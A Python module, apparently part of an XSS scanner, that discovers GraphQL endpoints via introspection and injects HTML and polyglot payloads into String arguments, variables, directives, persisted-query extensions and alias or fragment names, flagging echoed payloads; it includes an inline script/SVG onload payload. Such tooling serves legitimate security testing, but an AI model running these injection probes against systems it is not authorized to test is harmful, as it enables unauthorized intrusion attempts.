# graphql_scanner.py

import json
import logging
from urllib.parse import urljoin

from network import make_request
# prepare_request_args not used currently
from payloads import DEFAULT_XSS_PAYLOADS

logger = logging.getLogger("xsscanner.graphql")

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args {
          name
          type {
            kind
            name
            ofType { 
              kind
              name
            }
          }
        }
      }
    }
  }
}
"""

def discover_graphql_endpoints(base_url: str) -> list[str]:
    """
    Coba beberapa path umum untuk GraphQL menggunakan introspection POST.
    Endpoint valid bila merespons JSON dengan data.__schema.
    """
    candidates = ["/graphql", "/api/graphql", "/graphql/"]
    endpoints: list[str] = []
    headers = {"Content-Type": "application/json"}
    for path in candidates:
        url = urljoin(base_url, path)
        try:
            body = json.dumps({"query": INTROSPECTION_QUERY})
            resp = make_request(url, method="POST", data=body, headers=headers)
            if not (resp and resp.ok):
                continue
            ctype = resp.headers.get("Content-Type", "")
            if "application/json" not in ctype:
                continue
            data = resp.json()
            if isinstance(data, dict) and "data" in data and data["data"].get("__schema"):
                endpoints.append(url)
        except Exception as e:
            logger.debug(f"GraphQL endpoint check failed at {url}: {e}")
    return endpoints

def introspect_schema(endpoint: str) -> dict:
    """
    Lakukan introspection query, kembalikan dict __schema atau {}.
    """
    headers = {"Content-Type": "application/json"}
    body = json.dumps({"query": INTROSPECTION_QUERY})
    resp = make_request(endpoint, method="POST", data=body, headers=headers)
    if not resp or not resp.ok:
        return {}
    try:
        data = resp.json()
        return data.get("data", {}).get("__schema", {})
    except Exception:
        logger.warning(f"Invalid JSON from introspection at {endpoint}")
        return {}

def _introspection_enabled(resp_json: dict) -> bool:
    try:
        return bool(resp_json.get("data", {}).get("__schema"))
    except Exception:
        return False

def extract_operations(schema: dict) -> list[dict]:
    """
    Kembalikan list operasi yang punya argumen bertipe String/SCALAR.
    Masing-masing dict: {"op": "query"|"mutation", "name": str, "args": [str,...]}.
    """
    ops = []
    # cari nama root types
    for root in ("queryType", "mutationType"):
        rt = schema.get(root)
        if not rt or "name" not in rt:
            continue
        type_name = rt["name"]
        # cari definisi type
        for t in schema.get("types", []):
            if t.get("name") == type_name:
                for field in t.get("fields", []):
                    arg_names = []
                    for arg in field.get("args", []):
                        kind = arg["type"].get("kind")
                        name = arg["type"].get("name") or arg["type"].get("ofType", {}).get("name")
                        # fokus hanya SCALAR / String
                        if kind in ("SCALAR",) and name == "String":
                            arg_names.append(arg["name"])
                    if arg_names:
                        ops.append({
                            "op": "mutation" if root == "mutationType" else "query",
                            "name": field["name"],
                            "args": arg_names
                        })
                break
    return ops

def _send(endpoint: str, query: str, variables: dict | None = None):
    headers = {"Content-Type": "application/json"}
    body = {"query": query}
    if variables:
        body["variables"] = variables
    return make_request(endpoint, method="POST", data=json.dumps(body), headers=headers)


def test_graphql_xss(endpoint: str, schema: dict):
    """
    Untuk tiap operasi dan arg String, injeksi payload HTML/polygot,
    cek refleksi di response JSON.
    """
    ops = extract_operations(schema)
    if not ops:
        logger.info(f"No injectable operations in schema at {endpoint}")
        return

    print(f"[GraphQL] Testing {len(ops)} operations at {endpoint}")
    inj_err = '\");</script><svg/onload=alert(1)>'

    for op in ops:
        for arg in op["args"]:
            for category in ("html_tag_injection", "polyglot"):
                for payload in DEFAULT_XSS_PAYLOADS.get(category, []):
                    # bangun GraphQL query/mutation
                    args_assign = []
                    for a in op["args"]:
                        val = payload if a == arg else "test"
                        # pastikan JSON-valid
                        args_assign.append(f'{a}: "{val}"')
                    # 1) Inline args
                    gql = f'{op["op"]} {{ {op["name"]}({", ".join(args_assign)}) }}'
                    try:
                        resp = _send(endpoint, gql)
                        if resp and (payload in (resp.text or "")):
                            print(f"[GraphQL XSS] {endpoint} → {op['name']}.{arg} payload={payload}")
                            logger.info(f"GraphQL XSS at {endpoint} {op['name']}.{arg}")
                            raise StopIteration
                    except StopIteration:
                        break
                    # 2) Variables
                    var_defs = ", ".join([f'${a}: String' for a in op["args"]])
                    args_pass = ", ".join([f'{a}: ${a}' for a in op["args"]])
                    gqlv = f'{op["op"]}({var_defs}) {{ {op["name"]}({args_pass}) }}'
                    vars = {a: (payload if a == arg else "test") for a in op["args"]}
                    respv = _send(endpoint, gqlv, vars)
                    if respv and (payload in (respv.text or "")):
                        print(f"[GraphQL XSS] (vars) {endpoint} → {op['name']}.{arg} payload={payload}")
                        logger.info(f"GraphQL XSS (vars) at {endpoint} {op['name']}.{arg}")
                        break
                    # 3) Directive error bubbling (@include)
                    dirq = '{ __typename @include(if: "%s") }' % payload
                    respd = _send(endpoint, dirq)
                    if respd and (payload in (respd.text or "")):
                        print(f"[GraphQL Error Bubble] {endpoint} include@if with payload echoed")
                        logger.info(f"GraphQL error bubble at {endpoint}")
                        break
                else:
                    continue
                break

    # Fallback when introspection disabled: try generic error bubbling with inj_err
    try:
        r = _send(endpoint, '{ __typename @include(if: "%s") }' % inj_err)
        if r and (inj_err in (r.text or "")):
            print(f"[GraphQL Error Bubble] {endpoint} include@if echoed inj_err payload")
    except Exception:
        pass

    # Persisted query vector (Apollo/Relay): GET with extensions
    try:
        from urllib.parse import urlencode
        for payload in (DEFAULT_XSS_PAYLOADS.get('polyglot', []) or [])[:3]:
            ext = json.dumps({"persistedQuery": {"version": 1, "sha256Hash": payload }})
            qs = urlencode({
                'operationName': 'Any',
                'extensions': ext,
                'variables': json.dumps({})
            })
            url = endpoint + ('' if endpoint.endswith('?') else '?') + qs
            r = make_request(url, method='GET')
            if r and (payload in (r.text or '')):
                print(f"[GraphQL Persisted] {endpoint} reflected payload in extensions")
                break
    except Exception:
        pass

    # Alias/Fragment name injection to provoke error bubbling
    try:
        for payload in (DEFAULT_XSS_PAYLOADS.get('html_tag_injection', []) or [])[:2]:
            alias = 'x' + ''.join(c for c in payload if c.isalnum())[:8]
            q_alias = f"{{ {alias}: __typename }}"
            ra = _send(endpoint, q_alias)
            if ra and (payload in (ra.text or '')):
                print(f"[GraphQL Alias] {endpoint} alias echo")
                break
            frag = 'F' + ''.join(c for c in payload if c.isalnum())[:8]
            q_frag = f"fragment {frag} on Query {{ __typename }} query Q {{ __typename ...{frag} }}"
            rf = _send(endpoint, q_frag)
            if rf and (payload in (rf.text or '')):
                print(f"[GraphQL Fragment] {endpoint} fragment echo")
                break
    except Exception:
        pass
